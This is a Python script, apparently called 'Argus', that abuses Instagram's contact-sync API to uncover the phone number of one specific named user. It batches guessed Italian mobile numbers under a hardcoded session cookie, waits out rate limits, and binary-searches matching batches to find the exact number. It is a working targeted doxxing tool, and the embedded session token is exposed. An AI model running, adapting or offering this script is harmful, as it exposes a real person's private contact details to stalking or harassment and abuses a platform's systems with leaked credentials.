#!/usr/bin/env python3
"""
Argus — IG Contact Sync Phone Reverse Lookup.

Sends batches of candidate phone numbers to Instagram's address_book/link API.
Checks if target account (luigisav, ID 284908554) appears in the results.

Strategy without known digits:
- Italian mobile has ~60 active 3-digit prefixes
- Each prefix has 10M possible numbers (7 remaining digits)
- We can't brute force all 600M, so we use smart sampling:
  1. Try the most common prefixes first (TIM 33x, Vodafone 34x, Wind 32x)
  2. Send batches of 100 contacts per request
  3. For each prefix, sample across the number space
  4. If a batch returns the target, binary search to isolate the exact number
"""

import json
import os
import random
import re
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

SESSION_ID = "43181277251%3AiRmZBaLQo7rOcP%3A13%3AAYj37Fv1y6oSaOPevNpA8AGj6HI1uf2AuFEHagLiJg"
TARGET_IG_ID = "284908554"
TARGET_IG_USER = "luigisav"

# Italian mobile prefixes ordered by market share (most popular first)
PREFIXES_BY_PRIORITY = [
    # TIM (largest carrier Italy ~30%)
    "339", "338", "333", "334", "335", "336", "337", "330", "331",
    "360", "366", "368",
    # Vodafone (~29%)
    "340", "347", "348", "349", "346", "345", "344", "343", "342", "341",
    # Wind Tre (~25%)
    "320", "328", "329", "327", "323", "322",
    "389", "388", "393", "392", "391", "390", "383", "380",
    # Iliad (~10%)
    "351", "370", "371", "377", "378",
    # MVNO
    "350", "352", "373", "375",
]

DEVICE_ID = str(uuid.uuid4())
PHONE_ID = str(uuid.uuid4())
WATERFALL_ID = str(uuid.uuid4())


def ig_contact_sync(numbers_batch):
    """Send a batch of numbers to IG contact sync API. Returns list of user dicts."""
    contacts = []
    for i, num in enumerate(numbers_batch):
        # Format: international without +
        clean = num.replace("+", "").replace(" ", "")
        contacts.append({
            "phone_numbers": [clean],
            "first_name": f"C{i}",
            "last_name": "",
        })
    
    payload = urllib.parse.urlencode({
        "contacts": json.dumps(contacts),
        "phone_id": PHONE_ID,
        "module": "find_friends_contacts",
    }).encode()
    
    req = urllib.request.Request(
        "https://i.instagram.com/api/v1/address_book/link/",
        data=payload,
        headers={
            "User-Agent": "Instagram 275.0.0.27.98 Android (26/8.0.0; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US; 211900014)",
            "Cookie": f"sessionid={SESSION_ID}",
            "X-IG-App-ID": "936619743392459",
            "X-IG-Device-ID": DEVICE_ID,
            "X-IG-Android-ID": "android-" + DEVICE_ID[:16],
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    
    try:
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read())
            return data.get("users", []), None
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors="ignore")
        return [], (e.code, body[:200])
    except Exception as e:
        return [], (0, str(e))


def check_batch_for_target(numbers):
    """Check a batch for the target. Returns matched number or None."""
    users, error = ig_contact_sync(numbers)
    
    if error:
        code, msg = error
        if code == 429:
            return "RATE_LIMITED"
        elif code in (401, 403):
            return "SESSION_EXPIRED"
        return None
    
    for user in users:
        uid = str(user.get("pk", ""))
        uname = user.get("username", "")
        if uid == TARGET_IG_ID or uname == TARGET_IG_USER:
            return "FOUND"
    
    return None


def binary_search_number(prefix, range_start, range_end):
    """Binary search within a range to find the exact number."""
    print(f"    Binary search: +39{prefix}{range_start:07d} — +39{prefix}{range_end:07d}")
    
    while range_end - range_start > 1:
        mid = (range_start + range_end) // 2
        
        # Test lower half
        lower_numbers = [f"+39{prefix}{i:07d}" for i in range(range_start, mid)]
        result = check_batch_for_target(lower_numbers)
        
        if result == "RATE_LIMITED":
            print("    Rate limited, waiting 60s...")
            time.sleep(60)
            continue
        elif result == "SESSION_EXPIRED":
            print("    SESSION EXPIRED!")
            return None
        elif result == "FOUND":
            range_end = mid
            print(f"    Target in lower half: {range_start}-{mid}")
        else:
            range_start = mid
            print(f"    Target in upper half: {mid}-{range_end}")
        
        time.sleep(2)
    
    return f"+39{prefix}{range_start:07d}"


def main():
    print(f"""
╔══════════════════════════════════════════════════════════╗
║  ARGUS — IG Contact Sync Reverse Lookup                  ║
║  Target: @{TARGET_IG_USER} (ID: {TARGET_IG_ID})                    ║
║  Method: Address Book Sync → Phone Discovery             ║
╚══════════════════════════════════════════════════════════╝
""")
    
    # Phase 1: Test session
    print("[Phase 1] Session check...")
    test_nums = ["+393331234567"]
    users, error = ig_contact_sync(test_nums)
    if error:
        code, msg = error
        if code in (401, 403):
            print(f"  SESSION INVALID: {msg}")
            sys.exit(1)
        elif code == 429:
            print(f"  Rate limited on first request. Waiting 60s...")
            time.sleep(60)
        else:
            print(f"  Warning: {code} {msg}")
    else:
        print(f"  API accessible. Users returned: {len(users)}")
    
    time.sleep(2)
    
    # Phase 2: Smart prefix scanning
    # For each prefix, we sample random blocks of 100 numbers
    # and check if the target appears. This gives us O(N/100) coverage.
    print(f"\n[Phase 2] Prefix scanning ({len(PREFIXES_BY_PRIORITY)} prefixes)")
    print(f"  Strategy: 100 numbers/batch, 10 random batches/prefix")
    print(f"  Coverage: ~1000 numbers per prefix, ~{len(PREFIXES_BY_PRIORITY)*1000} total")
    
    total_checked = 0
    rate_limit_count = 0
    found_prefix = None
    found_range = None
    
    for pi, prefix in enumerate(PREFIXES_BY_PRIORITY):
        print(f"\n  [{pi+1}/{len(PREFIXES_BY_PRIORITY)}] Prefix +39{prefix}...")
        
        # Generate 10 random batches of 100 numbers each
        # Each batch covers a different section of the 10M number space
        for batch_num in range(10):
            # Random starting point in 0-9999999
            start = random.randint(0, 9999900)
            numbers = [f"+39{prefix}{(start + j):07d}" for j in range(100)]
            
            result = check_batch_for_target(numbers)
            total_checked += 100
            
            if result == "FOUND":
                print(f"    *** TARGET FOUND IN BATCH! ***")
                print(f"    Range: +39{prefix}{start:07d} to +39{prefix}{(start+99):07d}")
                found_prefix = prefix
                found_range = (start, start + 99)
                break
            elif result == "RATE_LIMITED":
                rate_limit_count += 1
                if rate_limit_count >= 3:
                    print(f"    Heavy rate limiting. Waiting 120s...")
                    time.sleep(120)
                    rate_limit_count = 0
                else:
                    print(f"    Rate limited. Waiting 30s...")
                    time.sleep(30)
            elif result == "SESSION_EXPIRED":
                print(f"    SESSION EXPIRED!")
                sys.exit(1)
            
            time.sleep(3)  # Gentle rate limiting
        
        if found_prefix:
            break
        
        # Show progress
        if (pi + 1) % 5 == 0:
            print(f"\n  Progress: {total_checked} numbers checked, {pi+1}/{len(PREFIXES_BY_PRIORITY)} prefixes")
    
    # Phase 3: If found, binary search for exact number
    if found_prefix and found_range:
        print(f"\n[Phase 3] Binary search to isolate exact number")
        exact = binary_search_number(found_prefix, found_range[0], found_range[1])
        
        if exact:
            print(f"\n{'═'*60}")
            print(f"  *** PHONE NUMBER FOUND ***")
            print(f"  Number: {exact}")
            print(f"  Target: @{TARGET_IG_USER} (ID: {TARGET_IG_ID})")
            print(f"{'═'*60}")
            
            # Save result
            with open("/tmp/argus_phone_result.json", "w") as f:
                json.dump({
                    "target": TARGET_IG_USER,
                    "target_id": TARGET_IG_ID,
                    "phone": exact,
                    "method": "ig_contact_sync",
                    "prefix": found_prefix,
                    "total_checked": total_checked,
                }, f, indent=2)
        else:
            print(f"\n  Binary search failed (session may have expired)")
    else:
        print(f"\n[Result] Target not found in {total_checked} numbers tested")
        print(f"  This means either:")
        print(f"  1. Phone number uses a less common prefix")
        print(f"  2. Phone is not linked to Instagram")
        print(f"  3. Need to scan more numbers (increase batches per prefix)")
        
        # Save progress
        with open("/tmp/argus_scan_progress.json", "w") as f:
            json.dump({
                "target": TARGET_IG_USER,
                "total_checked": total_checked,
                "prefixes_completed": [PREFIXES_BY_PRIORITY[i] for i in range(min(pi+1, len(PREFIXES_BY_PRIORITY)))],
                "status": "not_found",
            }, f, indent=2)


if __name__ == "__main__":
    main()
